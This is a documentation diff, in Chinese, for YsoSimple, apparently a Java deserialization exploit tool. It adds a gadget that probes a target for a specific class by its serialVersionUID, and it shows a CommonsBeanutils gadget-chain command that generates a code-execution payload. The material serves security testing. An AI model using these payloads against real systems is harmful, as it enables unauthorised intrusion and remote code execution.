@@ -114,6 +114,16 @@ YsoSimple工具中`TemplatesImpl:`​命令生成的字节码类需要继承Abst
 -m YsoAttack -g FindClassByBomb -a "java.lang.String|20"
 ```
 
+### FindClassByBombSuid
+
+描述：在不出网情况下测试Java反序列化漏洞是否存在，或者延迟探测目标是否有某个类。在CB依赖的15和16版本中类没有区别，但是在BeanComparator类suid不同，所以此时已经无法再只类名来延迟判断版本了，可使用javassist根据类名和serialVersionUID动态生成类然后序列化发送来探测。
+
+工具：以竖杠来分割，参数分别为类名，suid值，探测深度。
+
+```java
+-m YsoAttack -g FindClassByBombSuid -a "org.apache.commons.beanutils.BeanComparator|1L|24"
+```
+
 ### FindClassByDNS
 
 描述：用DNS形式探测目标系统中是否存在某个类
@@ -489,7 +499,7 @@ CommonsBeanutils利用链很常见但是比较麻烦的是，CB依赖版本不�
 
 ##### CommonsBeanutils2_110(1.10.0)
 
-```
+```bash
 -m YsoAttack -g CommonsBeanutils2_110 -a "Templateslmpl:auto_cmd:calc"
 ```
 
